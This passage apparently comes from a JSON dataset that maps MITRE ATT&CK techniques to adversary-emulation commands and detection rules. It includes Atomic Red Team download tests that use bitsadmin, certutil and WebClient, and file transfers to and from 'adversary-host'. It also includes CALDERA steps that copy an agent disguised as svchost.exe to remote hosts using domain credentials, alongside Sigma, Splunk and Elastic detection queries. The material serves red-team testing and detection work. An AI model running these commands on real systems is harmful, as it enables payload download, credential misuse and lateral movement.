{"mitre_attack": "T1101", "file_value": "", "file_path": "", "parent_process": "caspol.exe", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Ieexec.md", "chain_id": "100212", "registry_value": "", "mitre_caption": "web_shell", "registry_path": "", "frequency": "rare", "commandline_string": "-s off", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1101": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"}}}, {"process": {"cmdline": {"pattern": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"}}, "type": "process"}], "description": null, "name": "Security Support Provider", "level": "medium"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1101", "Empire Module": "powershell/persistence/misc/get_ssps", "Technique": "Security Support Provider", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/get_ssps\":  [\"T1101\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1101", "Empire Module": "powershell/persistence/misc/install_ssp", "Technique": "Security Support Provider", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/install_ssp\":  [\"T1101\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1101", "Empire Module": "powershell/persistence/misc/memssp", "Technique": "Security Support Provider", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/memssp\":  [\"T1101\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1102/T1102.yaml", "command": "bitsadmin.exe /transfer \"DonwloadFile\" http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n", "name": null}, {"source": "atomics/T1102/T1102.yaml", "command": "Invoke-WebRequest -Uri www.twitter.com\n$T1102 = (New-Object System.Net.WebClient).DownloadData(\"https://www.reddit.com/\")\n$wc = New-Object System.Net.WebClient\n$T1102 = $wc.DownloadString(\"https://www.aol.com/\")\n", "name": null}], "command_list": ["bitsadmin.exe /transfer \"DonwloadFile\" http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n", "Invoke-WebRequest -Uri www.twitter.com\n$T1102 = (New-Object System.Net.WebClient).DownloadData(\"https://www.reddit.com/\")\n$wc = New-Object System.Net.WebClient\n$T1102 = $wc.DownloadString(\"https://www.aol.com/\")\n"], "technique_id": "T1102", "parsed_datasets": [{"Atomic Red Team Test - Web Service": {"display_name": "Web Service", "atomic_tests": [{"description": "Download data from a public website using command line\n", "supported_platforms": ["windows"], "name": "Reach out to C2 Pointer URLs via command_prompt", "executor": {"elevation_required": false, "command": "bitsadmin.exe /transfer \"DonwloadFile\" http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n", "name": "command_prompt", "cleanup_command": "del %TEMP%\\bitsadmindownload.html >nul 2>&1\n"}}, {"description": "Multiple download methods for files using powershell\n", "supported_platforms": ["windows"], "name": "Reach out to C2 Pointer URLs via powershell", "executor": {"elevation_required": false, "command": "Invoke-WebRequest -Uri www.twitter.com\n$T1102 = (New-Object System.Net.WebClient).DownloadData(\"https://www.reddit.com/\")\n$wc = New-Object System.Net.WebClient\n$T1102 = $wc.DownloadString(\"https://www.aol.com/\")\n", "name": "powershell", "cleanup_command": "Clear-Variable T1102 >$null 2>&1"}}], "attack_technique": "T1102"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1103/T1103.yaml", "command": "reg.exe import T1103.reg\n", "name": null}, {"source": "SysmonHunter - AppInit DLLs", "command": "Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs|Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs", "name": null}], "command_list": ["reg.exe import T1103.reg\n", "Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs|Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs"], "technique_id": "T1103", "parsed_datasets": [{"Atomic Red Team Test - AppInit DLLs": {"display_name": "AppInit DLLs", "atomic_tests": [{"description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system\n", "supported_platforms": ["windows"], "name": "Install AppInit Shim", "input_arguments": {"registry_file": {"default": "T1103.reg", "type": "Path", "description": "Windows Registry File"}}, "executor": {"elevation_required": true, "command": "reg.exe import #{registry_file}\n", "name": "command_prompt"}}], "attack_technique": "T1103"}}, {"SysmonHunter - T1103": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs|Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs"}}}], "description": null, "name": "AppInit DLLs", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\Appinit_Dlls\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\Appinit_Dlls\\\\\")", "product": "Azure Sentinel", "name": "AppInit DLLs"}, {"query": "title: New DLL added to AppInit_DLLs registry key\nid: 4f84b697-c9ed-4420-8ab5-e09af5b2345d\nstatus: experimental\ndescription: DLLs that are specified in the AppInit_DLLs value in the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll\n    into every process that loads user32.dll\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/822dc4c5-b355-4df8-bd37-29c458997b8f.html\ntags:\n    - attack.persistence\n    - attack.t1103\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n      - EventID: \n            - 12 # key create\n            - 13 # value set\n        TargetObject|contains: '\\SOFTWARE\\'\n        TargetObject|endswith: '\\Windows\\AppInit_Dlls'\n      - EventID: 14 # key rename\n        NewName|contains: '\\SOFTWARE\\'\n        NewName|endswith: '\\Windows\\AppInit_Dlls'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unkown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: New DLL added to AppInit_DLLs registry key\nid: 4f84b697-c9ed-4420-8ab5-e09af5b2345d\nstatus: experimental\ndescription: DLLs that are specified in the AppInit_DLLs value in the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll\n    into every process that loads user32.dll\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/822dc4c5-b355-4df8-bd37-29c458997b8f.html\ntags:\n    - attack.persistence\n    - attack.t1103\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n      - EventID: \n            - 12 # key create\n            - 13 # value set\n        TargetObject|contains: '\\SOFTWARE\\'\n        TargetObject|endswith: '\\Windows\\AppInit_Dlls'\n      - EventID: 14 # key rename\n        NewName|contains: '\\SOFTWARE\\'\n        NewName|endswith: '\\Windows\\AppInit_Dlls'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unkown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:(\"12\" OR \"13\") AND TargetObject.keyword:*\\\\\\\\SOFTWARE\\\\* AND TargetObject.keyword:*\\\\\\\\Windows\\\\\\\\AppInit_Dlls) OR (EventID:\"14\" AND NewName.keyword:*\\\\\\\\SOFTWARE\\\\* AND NewName.keyword:*\\\\\\\\Windows\\\\\\\\AppInit_Dlls))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/New-DLL-added-to-AppInit_DLLs-registry-key <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"New DLL added to AppInit_DLLs registry key\",\\n    \"description\": \"DLLs that are specified in the AppInit_DLLs value in the Registry key HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows are loaded by user32.dll into every process that loads user32.dll\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1103\"\\n    ],\\n    \"query\": \"((EventID:(\\\\\"12\\\\\" OR \\\\\"13\\\\\") AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\AppInit_Dlls) OR (EventID:\\\\\"14\\\\\" AND NewName.keyword:*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\* AND NewName.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\AppInit_Dlls))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:(\\\\\"12\\\\\" OR \\\\\"13\\\\\") AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\AppInit_Dlls) OR (EventID:\\\\\"14\\\\\" AND NewName.keyword:*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\* AND NewName.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\AppInit_Dlls))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'New DLL added to AppInit_DLLs registry key\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n     EventID = {{_source.EventID}}\\\\n       Image = {{_source.Image}}\\\\nTargetObject = {{_source.TargetObject}}\\\\n     NewName = {{_source.NewName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:(\"12\" \"13\") AND TargetObject.keyword:*\\\\\\\\SOFTWARE\\\\* AND TargetObject.keyword:*\\\\\\\\Windows\\\\\\\\AppInit_Dlls) OR (EventID:\"14\" AND NewName.keyword:*\\\\\\\\SOFTWARE\\\\* AND NewName.keyword:*\\\\\\\\Windows\\\\\\\\AppInit_Dlls))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"12\" OR EventID=\"13\") TargetObject=\"*\\\\\\\\SOFTWARE\\\\*\" TargetObject=\"*\\\\\\\\Windows\\\\\\\\AppInit_Dlls\") OR (EventID=\"14\" NewName=\"*\\\\\\\\SOFTWARE\\\\*\" NewName=\"*\\\\\\\\Windows\\\\\\\\AppInit_Dlls\")) | table EventID,Image,TargetObject,NewName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id IN [\"12\", \"13\"] TargetObject=\"*\\\\\\\\SOFTWARE\\\\*\" TargetObject=\"*\\\\\\\\Windows\\\\\\\\AppInit_Dlls\") OR (event_id=\"14\" NewName=\"*\\\\\\\\SOFTWARE\\\\*\" NewName=\"*\\\\\\\\Windows\\\\\\\\AppInit_Dlls\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*12|.*13))(?=.*.*\\\\SOFTWARE\\\\.*)(?=.*.*\\\\Windows\\\\AppInit_Dlls))|.*(?:.*(?=.*14)(?=.*.*\\\\SOFTWARE\\\\.*)(?=.*.*\\\\Windows\\\\AppInit_Dlls))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{local_path} victim@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{local_path} #{username}@victim-host:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{username}@adversary-host:#{remote_path} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{local_file} victim@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{local_file} #{username}@victim-host:#{remote_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{local_file} #{username}@victim-host:/tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"$env:TEMP\\Atomic-license.txt\")\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")\n", "name": null}, {"source": "atomics/T1105/T1105.yaml", "command": "pushd \\\\localhost\\C$\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", "name": null}, {"source": "data/abilities/command-and-control/47d08617-5ce1-424a-8cc5-c9c978ce6bf9.yml", "command": {"windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}, "darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}}, "name": "Create a text file for the user to find"}, {"source": "data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml", "command": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Copy-Item -Path \"sandcat.go-windows\" -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payload": "sandcat.go-windows"}}, "darwin": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'\n", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~\n", "payload": "sandcat.go"}}, "linux": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'\n", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~ &&\n", "payload": "sandcat.go"}}}, "name": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP"}, {"source": "data/abilities/lateral-movement/65048ec1-f7ca-49d3-9410-10813e472b30.yml", "command": {"windows": {"psh": {"cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "payload": "sandcat.go-windows", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}}}}, "name": "Copy 54ndc47 to remote host (SMB)"}, {"source": "data/abilities/lateral-movement/c5e75d70-09ae-469f-8717-621a1b7ef946.yml", "command": {"windows": {"psh": {"cleanup": "$drive = \"#{remote.host.ip}\".replace(\".\",\"_\");\nRemove-Item -Path $drive\":\\Users\\Public\\svchost.exe\" -Force;\nRemove-PSDrive -Name $drive;\n", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$path = $env:USERPROFILE+\"\\sandcat.go-windows\";\n$drive = \"#{remote.host.ip}\".replace(\".\",\"_\");\nNew-PSDrive -Name $drive -PSProvider FileSystem -Root \"\\\\#{remote.host.ip}\\C$\" -Credential $cred;\nCopy-Item -Path $path -Destination $drive\":\\Users\\Public\\svchost.exe\";\n", "payload": "sandcat.go-windows"}, "cmd": {"cleanup": "erase \\\\#{remote.host.ip}\\c$\\Users\\Pubic\\svchost.exe /Q /F &\nnet use \\\\#{remote.host.ip}\\c$ /delete\n", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password} /persistent:no &\ncopy /B /Y sandcat.go-windows \\\\#{remote.host.ip}\\c$\\Users\\Pubic\\svchost.exe\n", "payload": "sandcat.go-windows"}}}, "name": "Copy 54ndc47 to remote host (SMB)"}], "command_list": ["rsync -r #{local_path} victim@#{remote_host}:#{remote_path}\n", "rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}\n", "rsync -r #{local_path} #{username}@victim-host:#{remote_path}\n", "rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files\n", "rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}\n", "rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files\n", "rsync -r #{username}@adversary-host:#{remote_path} #{local_path}\n", "rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}\n", "scp #{local_file} victim@#{remote_host}:#{remote_path}\n", "scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}\n", "scp #{local_file} #{username}@victim-host:#{remote_path}\n", "scp #{local_file} #{username}@victim-host:/tmp/victim-files/\n", "scp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}\n", "scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/\n", "sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'\n", "sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'\n", "sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'\n", "sftp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}\n", "sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/\n", "cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt\n", "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt\n", "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n", "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n", "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}\n", "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt\n", "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}\n", "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"$env:TEMP\\Atomic-license.txt\")\n", "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")\n", "pushd \\\\localhost\\C$\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", {"windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}, "darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}}, {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Copy-Item -Path \"sandcat.go-windows\" -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payload": "sandcat.go-windows"}}, "darwin": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'\n", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~\n", "payload": "sandcat.go"}}, "linux": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'\n", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~ &&\n", "payload": "sandcat.go"}}}, {"windows": {"psh": {"cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "payload": "sandcat.go-windows", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}}}}, {"windows": {"psh": {"cleanup": "$drive = \"#{remote.host.ip}\".replace(\".\",\"_\");\nRemove-Item -Path $drive\":\\Users\\Public\\svchost.exe\" -Force;\nRemove-PSDrive -Name $drive;\n", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$path = $env:USERPROFILE+\"\\sandcat.go-windows\";\n$drive = \"#{remote.host.ip}\".replace(\".\",\"_\");\nNew-PSDrive -Name $drive -PSProvider FileSystem -Root \"\\\\#{remote.host.ip}\\C$\" -Credential $cred;\nCopy-Item -Path $path -Destination $drive\":\\Users\\Public\\svchost.exe\";\n", 